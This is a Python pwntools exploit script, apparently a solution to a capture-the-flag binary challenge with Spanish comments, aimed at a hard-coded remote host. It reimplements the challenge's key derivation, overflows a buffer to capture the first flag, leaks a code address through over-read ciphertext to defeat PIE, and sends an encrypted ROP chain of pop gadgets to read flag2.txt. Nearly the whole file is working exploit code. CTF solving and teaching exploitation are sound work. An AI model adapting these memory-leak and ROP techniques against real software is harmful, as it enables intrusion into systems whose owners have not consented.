#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./main --host 1.2.3.4 --port 1234
from pwn import *
import re
from Crypto.Cipher import AES
from ctypes import CDLL

libc = CDLL("libc.so.6")


#args.LOCAL = False

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '167.235.132.30'
port = int(args.PORT or 2312)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled


#https://stackoverflow.com/questions/60331996/does-python-have-a-function-to-mimic-the-sequence-of-cs-rand/66937717#66937717

def seed(n):
    libc.srand(n)

def rand():
    return libc.rand()

def uamkdf2(password:bytes):
    XORKEY = b"Pues al final hubo reto de pwn y todo :)";
    key = bytearray(16)

    for i in range(len(password)):
        key[i%16] ^= password[i]

    for i in range(len(XORKEY)):
        key[i%16] ^= XORKEY[i]

    seed = 0
    for i in range(16):
        seed = (seed << 8) | (seed >> (32 - 8)) ^ key[i]
        seed &= 0xffffffff

    libc.srand(seed)

    for i in range(16):
        key[i] ^= libc.rand() % 256

    return key

def encrypt(key, plaintext):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext)

def decrypt(key, ciphertext):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(ciphertext)


assert uamkdf2(b"Abcdefghi12345678\n") == bytes.fromhex("9818b5b0362b418df29ac17606d67bdc")
assert uamkdf2(b"7KtrDCLP6YCC29D7Pq69t43LggFYgvwb") == bytes.fromhex("fa54c047fe6081d8bb79d233fd5f3fe4")


### FLAG 1
io = start()

io.sendline(b"1")
io.sendlineafter(b"Dime un ", b"1337")

line = io.recvline_contains(b"clave AES").decode()
key = re.search(r"tu mensaje: ([0-9a-f]+)", line).group(1)
log.info("Key: " + key)
key = bytes.fromhex(key)

# sobrescribimos todo el buffer, y un poco más, con el valor de 32 bits 1337
v = 1337
plaintext= v.to_bytes(4, 'little')*8*4 * 2
ciphertext = encrypt(key, plaintext)

io.send(ciphertext)

flag = io.recvline_contains(b"UAM")
log.warn("Flag1: " + flag.decode())
io.close()


### FLAG 2

# LEAK de la dirección de flag1. 
# Para ello enviamos 128+1 bytes. El servidor cifrará 128+16 bytes, así que podemos obtener 15 bytes de la memoria, que contienen la dirección de la función flag1
io = start()
io.recvuntil(b"Elige")

io.sendline(b"3")
io.recvline_contains(b"cifrado:")
io.send(b'Abcdefghi12345678')

io.recvline_contains(b"Esta es la clave AES")
key = bytes.fromhex(io.recvline().decode())

assert(key == uamkdf2(b'Abcdefghi12345678')), f"Key: {key.hex()} - Expected: {uamkdf2(b'Abcdefghi12345678').hex()}"

io.recvline_contains(b"tu mensaje")
io.send(b"A"*129)

io.recvline_contains(b"Tu mensaje cifrado es")
ct = io.recvline().decode()
ct = bytes.fromhex(ct)

pt = decrypt(key, ct)

flag1_address = u64(pt[128:128+8])
# El byte menos significativo lo hemos perdido, pero podemos recuperarlo del propio binario
flag1_address = flag1_address & 0xffffffffffffff00
flag1_address = flag1_address | (exe.symbols['flag1'] & 0xff)
log.info("Flag1 address: " + hex(flag1_address))


# Establecemos la dirección base del ejecutable, y así poder obtener fácilmente el resto de direcciones.
exe.address = flag1_address - exe.symbols['flag1']

# En el propio binario hay uns tring "flag2.txt\x00", que podemos usar en el payload
flag2_str = next(exe.search(b"flag2.txt\x00"))
log.info("Adress of \"flag2.txt\\x00\": " + hex(flag2_str))


# FLAG2
# El servidor no da una clave, de la que derivamos la key de cifrado AES
io.sendline(b"2")
line = io.recvline_contains(b"Esta es la password").decode()
password = line.split(' ')[-1].strip()
key = uamkdf2(password.encode())
log.info("Passphrase: " + password)
log.info("Key: " + key.hex())

# Enviamos el mensaje cifrado, que el servidor descifrará, provocando un buffer overflow
io.recvline_contains(b"mensaje cifrado:")


# Calculamos los widgets necesarios para el payload. Lo hacemos así para no tener que adaptar el exploit por cambios pequeños en el binari durante el desarrollo
pop_rax = next(exe.search(b'\x58\xc3',executable=True)) 
pop_rbp = next(exe.search(b'\x5d\xc3',executable=True)) 
pop_rsi = next(exe.search(b'\x5e\xc3',executable=True)) 
# Hack para encontrar el código que espera un punto al fichero en rax, y lo imprime por pantalla. Mismo motivo.
s = exe.search(b'\x48\x89\xC7\xB8\x00\x00\x00\x00\xE8',executable=True)
print_flag = [ x for x in s if x > exe.symbols['flag1']][5]  # sexta ocurrencia de la cadena después de flag1()


# Payload... establece RBP a una zona de memoria que controlamos, y luego llama al código que imprime la flag1, pero con rax apuntando al string flag2.txt calculado antes.
payload = flat(
    b"A"*280,
    pop_rbp, exe.bss(0x100),
    pop_rax, flag2_str,
    pop_rsi, 0,
    print_flag,

)
ct = encrypt(key, payload)
io.send(ct)

flag = io.recvline_contains(b"UAM")
log.warn("Flag2: " + flag.decode())

io.close()
